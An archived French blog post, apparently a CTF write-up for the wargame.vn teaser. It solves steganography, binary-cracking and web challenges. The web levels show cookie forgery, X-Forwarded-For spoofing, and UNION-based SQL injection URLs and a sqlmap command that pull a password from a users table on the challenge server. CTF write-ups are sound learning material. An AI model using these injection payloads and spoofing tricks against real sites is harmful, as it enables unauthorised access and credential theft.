@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>CTF wargamevn writeups</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//Techbrunch.github.io/hubpress.io/themes/Casper/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/css/screen.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html" />
+    
+    <meta property="og:site_name" content="" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="CTF wargamevn writeups" />
+    <meta property="og:description" content="Stegano 50 11216311219611#9632969363 Flag được viết bằng chữ in thường, không có dấu cách (space) Google translate nous permet de comprendre que le flag attendu est en minuscule et qu&amp;#8217;il n&amp;#8217;y a pas d&amp;#8217;..." />
+    <meta property="og:url" content="https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html" />
+    <meta property="article:published_time" content="2013-08-17T22:00:00.000Z" />
+    <meta property="article:modified_time" content="2015-04-05T12:12:49.166Z" />
+    <meta property="article:tag" content="security" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="CTF wargamevn writeups" />
+    <meta name="twitter:description" content="Stegano 50 11216311219611#9632969363 Flag được viết bằng chữ in thường, không có dấu cách (space) Google translate nous permet de comprendre que le flag attendu est en minuscule et qu&amp;#8217;il n&amp;#8217;y a pas d&amp;#8217;..." />
+    <meta name="twitter:url" content="https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "",
+    "author": {
+        "@type": "Person",
+        "name": null,
+        "image": "https://avatars.githubusercontent.com/u/1835765?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://techbrunch.github.io/"
+    },
+    "headline": "CTF wargamevn writeups",
+    "url": "https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html",
+    "datePublished": "2013-08-17T22:00:00.000Z",
+    "dateModified": "2015-04-05T12:12:49.166Z",
+    "keywords": "security",
+    "description": "Stegano 50 11216311219611#9632969363 Flag được viết bằng chữ in thường, không có dấu cách (space) Google translate nous permet de comprendre que le flag attendu est en minuscule et qu&amp;#8217;il n&amp;#8217;y a pas d&amp;#8217;..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="" href="https://Techbrunch.github.io/hubpress.io/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template tag-security">
+
+    
+
+
+<header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="https://Techbrunch.github.io/hubpress.io">Home</a>
+        <!-- <a class="subscribe-button icon-feed" href="https://Techbrunch.github.io/hubpress.io/rss/">Subscribe</a> -->
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post tag-security">
+
+        <header class="post-header">
+            <h1 class="post-title">CTF wargamevn writeups</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2013-08-18">18 August 2013</time>  on <a href="https://Techbrunch.github.io/hubpress.io/tag/security">security</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <div class="sect1">
+<h2 id="_stegano_50">Stegano 50</h2>
+<div class="sectionbody">
+<div class="literalblock">
+<div class="content">
+<pre>11216311219611#9632969363
+Flag được viết bằng chữ in thường, không có dấu cách (space)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Google translate nous permet de comprendre que le flag attendu est en minuscule et qu&#8217;il n&#8217;y a pas d&#8217;espace. Le texte fait penser à une technique qui consiste à coder le message en utilisant les touches d&#8217;un téléphone portable<span class="footnote">[<a id="_footnoteref_1" class="footnote" href="#_footnote_1" title="View footnote.">1</a>]</span>.</p>
+</div>
+<div class="paragraph">
+<p>Pas de chance, cela ne semble pas être la méthode utilisée dans ce cas là, tant pis on va faire un petit tour sur <a href="https://www.google.com/search?q=11216311219611%239632969363">google</a>. Le premier résultat retourné nous amène sur une <a href="http://www.youtube.com/watch?v=WKrfEFf6C2I">vidéo</a> qui nous explique comment faire de la musique avec son portable.</p>
+</div>
+<div class="paragraph">
+<p>En fouillant dans les commentaires on tombe sur notre message "codé":</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>To play happy birthday on an iphone press these buttons: 11216311219611#9632969363</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Et effectivement le flag est bien: <strong>happybirthday</strong></p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_bin_50">Bin 50</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Bon alors pour celui là j&#8217;y suis allé à l&#8217;intuition :P</p>
+</div>
+<div class="paragraph">
+<p>On se retrouve avec un fichier binaire, comme le reverse et l&#8217;ASM c&#8217;est pas encore mon fort je sors IDA et je génère le pseudo-code C de la routine principale.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-c" data-lang="c">int __cdecl main(signed int a1, int a2)
+{
+  int v3; // [sp+14h] [bp-Ch]@3
+  signed int i; // [sp+18h] [bp-8h]@17
+  int v5; // [sp+1Ch] [bp-4h]@1
+
+  v5 = *(_DWORD *)(a2 + 4);
+  if ( a1 &gt; 1 ){
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"w@R6me") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"@R6me") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"R6me") )
+      return 0;
+    ++v5;
+    v3 = *(_BYTE *)v5;
+    if ( strcmp((const char *)&amp;v3, L"") )
+      return 0;
+    ++v5;
+    printf("HERE IS YOUR FLAG: ");
+    for ( i = 0; i &lt;= 27; ++i )
+      putchar((i + 1) ^ flag[i]);
+  }
+  else{
+    printf("%s &lt;keystring&gt;\n", *(_DWORD *)a2);
+  }
+  return 0;
+}</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Alors on voit qu&#8217;un certain nombre de tests sont fait sur la chaine passée en argument, si on regarde le premier test on voit qu&#8217;une comparaison est faite avec la chaine <code>w@R6me</code> ce qui ressemble fortement à la chaine <code>wargame</code> version "l33t".</p>
+</div>
+<div class="paragraph">
+<p>On test pour voir:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>techbrunch@blog:~/541490 (master) $ ./go w@R6@me
+HERE IS YOUR FLAG: teaser_simplecrackshouldwork</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>et paf le Flag :)</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_web_50">Web 50</h2>
+<div class="sectionbody">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+error_reporting(0);
+$flag = file('../../flag.txt');
+if ($_GET['x']==="\x01\x03\x03\x07")
+    echo $flag[0];
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Solution :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web50_4e4d6c332b6fe62a63afe56171fd3725/?x=%01%03%03%07</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Flag : <strong>teaser_web50_is_easy:)</strong></p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_web_100">Web 100</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Le web 100 était constitué d&#8217;une série de 7 niveaux.</p>
+</div>
+<div class="sect2">
+<h3 id="_level_1">Level 1</h3>
+<div class="paragraph">
+<p>Premier niveau on arrive sur la page et un message s&#8217;affiche:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>It works</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On jette un coup d&#8217;oeil au code source:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-html" data-lang="html">&lt;html&gt;&lt;h1&gt;It works&lt;/h1&gt;&lt;/html&gt;
+[...]
+&lt;!-- next: level2.php --&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>et on trouve le lien pour le niveau 2.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_level_2">Level 2</h3>
+<div class="paragraph">
+<p>Cette fois ci le message est différent:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>You're not logged in!</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Cette fois ci rien d&#8217;intéressant dans le code de la page. On va s&#8217;intéresser aux en-tête et plus particulièrement à la réponse envoyé par le serveur:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Connection:Keep-Alive
+Content-Encoding:gzip
+Content-Length:41
+Content-Type:text/html
+Date:Fri, 26 Jul 2013 15:48:33 GMT
+Keep-Alive:timeout=5, max=100
+Server:Apache/2.2.22 (Ubuntu)
+Set-Cookie:login=0; expires=Thu, 01-Jan-1970 00:00:01 GMT
+Vary:Accept-Encoding
+X-Powered-By:PHP/5.4.6-1ubuntu1.3</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Apparement il nous faut un cookie login que l&#8217;on va setter à 1.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-ruby" data-lang="ruby">require 'uri'
+require 'net/http'
+
+uri = URI("http://challenges.wargame.vn:1337");
+http = Net::HTTP.new(uri.host, uri.port)
+headers = {
+    'Cookie' =&gt; 'login=1'
+}
+
+puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/level2.php', headers).body</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On exécute le srcipt  et direction le level 3:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>techbrunch@yop:~/562394 $ ruby level2.rb
+&lt;h1&gt;Ops!&lt;/h1&gt;&lt;!-- l3v3l_3.php --&gt;
+techbrunch@yop:~/562394 $</pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_level3">Level3</h3>
+<div class="paragraph">
+<p>Même message qu&#8217;au niveau 2:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>You're not logged in!</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Set-Cookie:login=96.29.172.198; expires=Thu, 01-Jan-1970 00:00:01 GMT</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Cette fois ci le cookie doit contenir une adresse ip, et un commentaire dans le code de la page nous laisse supposer qu&#8217;il que que l&#8217;adresse ip soit <code>127.0.0.1</code>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-ruby" data-lang="ruby">require 'uri'
+require 'net/http'
+
+uri = URI("http://challenges.wargame.vn:1337");
+http = Net::HTTP.new(uri.host, uri.port)
+headers = {
+    'Cookie' =&gt; 'login=127.0.0.1'
+}
+
+puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/l3v3l_3.php', headers).body</code></pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>techbrunch@yop:~/562394 $ ruby level3.rb
+&lt;!-- 127.0.0.1 --&gt;
+&lt;h1&gt;Ops!&lt;/h1&gt;&lt;!-- l3v3l___4.php --&gt;</pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_level_4">Level 4</h3>
+<div class="paragraph">
+<p>Pour le level 4 on se retrouve avec un commentaire qui laisse penser qu&#8217;un header http spécifique doit être présent pour passer au niveau suivant.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;!-- if($_SERVER['HTTP_1337']=='1337') --&gt;
+Array
+(
+    [HTTP_HOST] =&gt; challenges.wargame.vn:1337
+    [...] =&gt; ...
+    [REQUEST_TIME] =&gt; 1374854460
+)</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On modifie notre script précédent et c&#8217;est reparti:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-ruby" data-lang="ruby">require 'uri'
+require 'net/http'
+
+uri = URI("http://challenges.wargame.vn:1337");
+http = Net::HTTP.new(uri.host, uri.port)
+headers = {
+    '1337' =&gt; '1337'
+}
+
+puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/l3v3l___4.php', headers).body</code></pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>techbrunch@yop:~/562394 $ ruby level4.rb
+&lt;!-- if($_SERVER['HTTP_1337']=='1337') --&gt;
+Array
+(
+    [HTTP_1337] =&gt; 1337
+    [...] =&gt; ...
+    [REQUEST_TIME] =&gt; 1374854625
+)
+&lt;h1&gt;Ops!&lt;/h1&gt;&lt;!-- level_$5.php --&gt;
+techbrunch@yop:~/562394 $</pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_level5">Level5</h3>
+<div class="paragraph">
+<p>Cette fois ci il semblerait qu&#8217;un filtrage soit effectué en fonction de l&#8217;adresse ip:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-html" data-lang="html">&lt;!-- if($ip="127.0.0.1") fet lag(); --&gt;
+Array
+(
+    [HTTP_HOST] =&gt; challenges.wargame.vn:1337
+    [...] =&gt; ...
+    [REQUEST_TIME] =&gt; 1374854684
+)
+&lt;br /&gt;&lt;br /&gt;Your IP: &lt;strong&gt;96.29.172.198&lt;/strong&gt;&lt;br /&gt;You're not an admin! Get out X-(
+----</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Le script semble reposer sur les header http pour récupéré l&#8217;adresse ip. On va donc ajouté un header <code>X_FORWARDED_FOR</code> pour faire croire au script que notre adresse ip est <code>127.0.0.1</code>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-ruby" data-lang="ruby">require 'uri'
+require 'net/http'
+
+uri = URI("http://challenges.wargame.vn:1337");
+http = Net::HTTP.new(uri.host, uri.port)
+headers = {
+    'X_FORWARDED_FOR' =&gt; '127.0.0.1'
+}
+
+puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/level_$5.php', headers).body</code></pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>techbrunch@yop:~/562394 $ ruby level5.rb
+&lt;!-- if($ip="127.0.0.1") flag(); --&gt;
+Array
+(
+    [HTTP_X_FORWARDED_FOR] =&gt; 127.0.0.1
+    [...] =&gt; ...
+    [REQUEST_TIME] =&gt; 1374854949
+)
+&lt;br /&gt;&lt;br /&gt;Your IP: &lt;strong&gt;127.0.0.1&lt;/strong&gt;&lt;br /&gt;&lt;h1&gt;Ops!&lt;/h1&gt;&lt;!-- lev3l_$6_.php --&gt;
+techbrunch@yop:~/562394 $</pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_level_6">Level 6</h3>
+<div class="paragraph">
+<p>Cette fois-ci c&#8217;est un message de bienvenue qui s&#8217;affiche:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Hello manhluat!</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>L&#8217;url est plus intéressante que les fois précédante et ça sent l&#8217;injection SQL à plein nez:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1
+http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1
+http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 or 1=2--
+http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 or 1=1--</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Le message de bienvenue ne s&#8217;affiche qu&#8217;avec la première et la dernière URL ce qui confirme que nous somme en présence d&#8217;une faille de type injection SQL.</p>
+</div>
+<div class="paragraph">
+<p>On va cherche le nombre de colonne de la requête:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 order by 3-- OK
+http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 order by 4-- NOK</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Le select se fait sur 3 colonnes.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 union select 1,2,3--</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Hello 2!</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Le nom d&#8217;utilisateur est la deuxième colonne sélectionnée.</p>
+</div>
+<div class="paragraph">
+<p>Pour le fun un petit coup de SQLmap :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>c:\Python27&gt;python.exe "c:\Program Files\sqlmap\sqlmap.py" -u http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 --technique=U --union-cols=3 -T users --common-columns"</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>[19:32:58] [INFO] retrieved: id
+[19:32:59] [INFO] retrieved: username
+[19:33:01] [INFO] retrieved: rowid
+[19:33:07] [INFO] tried 179/2447 items (7%)
+[19:33:07] [INFO] waiting for threads to finish (Ctrl+C was pressed)
+[19:33:08] [WARNING] user aborted during column existence check. sqlmap will dis
+play partial output</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Database: All
+Table: users
+[3 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| id       | numeric |
+| rowid    | numeric |
+| username | numeric |
++----------+---------+</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On sait désormais le nom des trois colonnes utilisées.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1-1 union select 1,(select count(*) from users),3--</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Hello 2!</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Il y a deux utilisateurs dans la table users, le flag est donc surement le mot de passe de l&#8217;autre utilisateur.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1-1 union select 1,(select password from users where id&lt;&gt;1),3--</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Hello $level7_.php!</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Bingo !</p>
+</div>
+<div class="paragraph">
+<p>Bon je me suis arrêté là par manque de temps et de motivation mais c'était fun quand même.</p>
+</div>
+</div>
+</div>
+</div>
+<div id="footnotes">
+<hr>
+<div class="footnote" id="_footnote_1">
+<a href="#_footnoteref_1">1</a> <a href="http://www.dbcovers.com/image-of-half-nelson-2006-half_nelson_2006_1">SMS Text Message Decoder</a>
+</div>
+</div>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="" style="background-image: url(https://avatars.githubusercontent.com/u/1835765?v=3)"><span class="hidden">'s Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href=""></a></h4>
+
+                    <p>Read <a href="">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    <span class="author-link icon-link"><a href="http://techbrunch.github.io/">http://techbrunch.github.io/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=CTF%20wargamevn%20writeups&amp;url=https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://Techbrunch.github.io/hubpress.io/2013/08/18/CTF-wargamevn-writeups.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="https://Techbrunch.github.io/hubpress.io"></a> &copy; 2015</section>
+        <section class="poweredby">Proudly published with <a href="http://hubpress.io">HubPress</a></section>
+    </footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/jquery.fitvids.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/index.js?v=1.0.0"></script>
+
+</body>
+</html>
